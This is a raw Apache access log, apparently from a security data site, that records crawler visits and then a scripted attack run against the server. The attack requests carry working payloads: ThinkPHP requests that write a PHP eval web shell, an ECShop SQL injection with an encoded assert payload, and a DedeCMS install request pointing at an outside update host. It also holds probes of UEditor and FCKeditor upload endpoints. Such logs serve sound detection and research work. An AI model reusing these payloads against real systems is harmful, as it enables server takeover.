216.244.66.245 - - [08/Jun/2023:01:58:14 -0700] "GET /self.logs/error.log.2023-04-16.gz HTTP/1.1" 200 1082 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
147.78.47.249 - - [08/Jun/2023:03:06:31 -0700] "GET /_ignition/health-check/ HTTP/1.1" 301 484 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
147.78.47.249 - - [08/Jun/2023:03:06:31 -0700] "GET /_ignition/health-check/ HTTP/1.1" 429 449 "http://secrepo.com/_ignition/health-check/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
147.78.47.249 - - [08/Jun/2023:03:06:33 -0700] "GET /public/_ignition/health-check/ HTTP/1.1" 301 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
147.78.47.249 - - [08/Jun/2023:03:06:33 -0700] "GET /public/_ignition/health-check/ HTTP/1.1" 429 449 "http://secrepo.com/public/_ignition/health-check/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
45.131.194.237 - - [08/Jun/2023:03:07:55 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Screaming Frog SEO Spider/18.5" 
45.131.194.203 - - [08/Jun/2023:03:07:55 -0700] "GET / HTTP/1.1" 200 13185 "-" "Screaming Frog SEO Spider/18.5" 
114.119.157.218 - - [08/Jun/2023:03:07:57 -0700] "GET /self.logs/error.log.2020-12-15 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.146.70 - - [08/Jun/2023:03:10:16 -0700] "GET /self.logs/error.log.2020-08-29 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.133.67 - - [08/Jun/2023:03:12:33 -0700] "GET /self.logs/error.log.2020-10-17 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.159.86 - - [08/Jun/2023:03:14:15 -0700] "GET /self.logs/error.log.2020-06-01 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.163.52 - - [08/Jun/2023:03:16:42 -0700] "GET /self.logs/error.log.2020-11-23 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
122.10.45.213 - - [08/Jun/2023:03:16:46 -0700] "GET /login.php?s=Admin/login HTTP/1.1" 301 521 "-" "python-requests/2.31.0" 
122.10.45.213 - - [08/Jun/2023:03:16:47 -0700] "GET /login.php?s=Admin/login HTTP/1.1" 404 328 "-" "python-requests/2.31.0" 
114.119.136.224 - - [08/Jun/2023:03:18:38 -0700] "GET /self.logs/error.log.2020-05-06 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.140.85 - - [08/Jun/2023:03:19:05 -0700] "GET /self.logs/error.log.2020-03-03 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
103.246.218.47 - - [08/Jun/2023:03:20:49 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "http://secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.246.218.47 - - [08/Jun/2023:03:20:50 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 328 "http://secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.246.218.47 - - [08/Jun/2023:03:20:51 -0700] "POST /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=avxgn.php&updateHost=http://url2023.top/ HTTP/1.1" 301 713 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=avxgn.php&updateHost=http://url2023.top/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; YPC 3.2.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)" 
103.246.218.47 - - [08/Jun/2023:03:20:52 -0700] "POST /Ueditor/controller.ashx?action=catchimage HTTP/1.1" 301 556 "http://secrepo.com/Ueditor/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; nl; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5" 
103.246.218.47 - - [08/Jun/2023:03:20:53 -0700] "POST /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 509 "http://secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.246.218.47 - - [08/Jun/2023:03:20:53 -0700] "GET /Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 404 305 "http://secrepo.com/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.246.218.47 - - [08/Jun/2023:03:20:53 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko) Safari/125" 
103.246.218.47 - - [08/Jun/2023:03:20:54 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 301 690 "http://secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.460.0 Safari/534.3" 
103.246.218.47 - - [08/Jun/2023:03:20:54 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:569:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4" 
103.246.218.47 - - [08/Jun/2023:03:20:54 -0700] "POST /kluyjg.php HTTP/1.1" 301 494 "http://secrepo.com/kluyjg.php" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
103.246.218.47 - - [08/Jun/2023:03:20:55 -0700] "GET /fckeditor/editor/filemanager/connectors/php/connector.php HTTP/1.1" 301 588 "http://secrepo.com/fckeditor/editor/filemanager/connectors/php/connector.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5" 
103.246.218.47 - - [08/Jun/2023:03:20:55 -0700] "GET /user.php?act=login HTTP/1.1" 301 510 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:569:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32747364586c715a7935776148416e4c4363385033426f6343426a6247467a63794248595530784d475a424e53423749484231596d78705979426d6457356a64476c766269426658324e76626e4e30636e566a6443676b5344647464545970657942415a585a68624367694c797061527a5636613235535a6c4e724b6938694c6952494e3231314e69346949696b3749483139626d563349456468545445775a6b45314b435266556b565256555654564673784d6a4e644b54732f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.2 Safari/533.2" 
103.246.218.47 - - [08/Jun/2023:03:20:55 -0700] "POST /kluyjg.php HTTP/1.1" 301 494 "http://secrepo.com/kluyjg.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.451.0 Safari/534.2" 
103.246.218.47 - - [08/Jun/2023:03:20:56 -0700] "GET /e/aspx/upload.aspx?a=pageadmin_cms HTTP/1.1" 301 542 "http://secrepo.com/e/aspx/upload.aspx?a=pageadmin_cms" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 ( .NET CLR 3.5.30729)" 
103.246.218.47 - - [08/Jun/2023:03:20:56 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 301 578 "http://secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8" 
103.246.218.47 - - [08/Jun/2023:03:20:57 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=aawcr.php&vars%5B1%5D%5B%5D=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'xise'%5D);?%3Edjsjxbei37$ HTTP/1.1" 301 1150 "http://secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=aawcr.php&vars[1][]=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['xise']);?>djsjxbei37$" "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.27" 
103.246.218.47 - - [08/Jun/2023:03:20:57 -0700] "GET /aawcr.php HTTP/1.1" 301 492 "http://secrepo.com/aawcr.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.160.0 Safari/530.0" 
103.246.218.47 - - [08/Jun/2023:03:20:57 -0700] "GET /index.php/Home/Uploadify/preview HTTP/1.1" 301 538 "http://secrepo.com/index.php/Home/Uploadify/preview" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3" 
103.246.218.47 - - [08/Jun/2023:03:20:58 -0700] "GET /index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write?cacheFile=qnc.php&content=%3C?php%20class%20GaM10fA5%20%7B%20public%20function%20__construct($H7mu6)%7B%20@eval(%22/*ZG5zknRfSk*/%22.$H7mu6.%22%22);%20%7D%7Dnew%20GaM10fA5($_REQUEST%5B'123'%5D);?%3EjwB9GE HTTP/1.1" 301 1006 "http://secrepo.com/index.php?s=index/\\think\\template\\driver\\file/write?cacheFile=qnc.php&content=<?php class GaM10fA5 { public function __construct($H7mu6){ @eval(\"/*ZG5zknRfSk*/\".$H7mu6.\"\"); }}new GaM10fA5($_REQUEST['123']);?>jwB9GE" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE) Chrome/4.0.223.3 Safari/532.2" 
103.246.218.47 - - [08/Jun/2023:03:20:58 -0700] "GET /SiteServer/Ajax/ajaxOtherService.aspx HTTP/1.1" 301 548 "http://secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5" 
103.246.218.47 - - [08/Jun/2023:03:20:59 -0700] "GET /index.php HTTP/1.1" 301 492 "http://secrepo.com/index.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9b4pre) Gecko/2008020708 Firefox/3.0b4pre" 
103.246.218.47 - - [08/Jun/2023:03:20:59 -0700] "GET /search.asp HTTP/1.1" 301 494 "http://secrepo.com/search.asp" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.463.0 Safari/534.3" 
103.246.218.47 - - [08/Jun/2023:03:20:59 -0700] "GET /search.asp?searchword=%7Bif:eval(action)%7D99&action=Response.Write(Hex(665554)) HTTP/1.1" 301 638 "http://secrepo.com/search.asp?searchword={if:eval(action)}99&action=Response.Write(Hex(665554))" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0" 
103.246.218.47 - - [08/Jun/2023:03:20:59 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 301 508 "http://secrepo.com/e/DoInfo/ecms.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0;)" 
103.246.218.47 - - [08/Jun/2023:03:21:00 -0700] "GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1" 301 566 "http://secrepo.com/seeyon/thirdpartyController.do.css/..;/ajax.do" "Mozilla/5.0 (Windows NT 6.1; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre Firefox/4.0b6pre" 
103.246.218.47 - - [08/Jun/2023:03:21:00 -0700] "GET /ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 564 "http://secrepo.com/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; lt; rv:1.9b4) Gecko/2008030714 Firefox/3.0b4" 
103.246.218.47 - - [08/Jun/2023:03:21:00 -0700] "GET /js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 570 "http://secrepo.com/js/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB6 (.NET CLR 3.5.30729)" 
103.246.218.47 - - [08/Jun/2023:03:21:00 -0700] "GET /static/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 578 "http://secrepo.com/static/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4" 
103.246.218.47 - - [08/Jun/2023:03:21:01 -0700] "GET /Scripts/Ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 580 "http://secrepo.com/Scripts/Ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko) Safari/125" 
103.246.218.47 - - [08/Jun/2023:03:21:01 -0700] "GET /Utility/UEditor?action=catchimage HTTP/1.1" 301 540 "http://secrepo.com/Utility/UEditor?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10" 
103.246.218.47 - - [08/Jun/2023:03:21:01 -0700] "GET /Utility/UEditor/net?action=catchimage HTTP/1.1" 301 548 "http://secrepo.com/Utility/UEditor/net?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1" 
103.246.218.47 - - [08/Jun/2023:03:21:02 -0700] "GET /Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 612 "http://secrepo.com/Content/scripts/plugins/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13" 
103.246.218.47 - - [08/Jun/2023:03:21:02 -0700] "GET /static/admin/js/plugins/ueditor/net/controller.ashx?action=catchimage HTTP/1.1" 301 612 "http://secrepo.com/static/admin/js/plugins/ueditor/net/controller.ashx?action=catchimage" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0" 
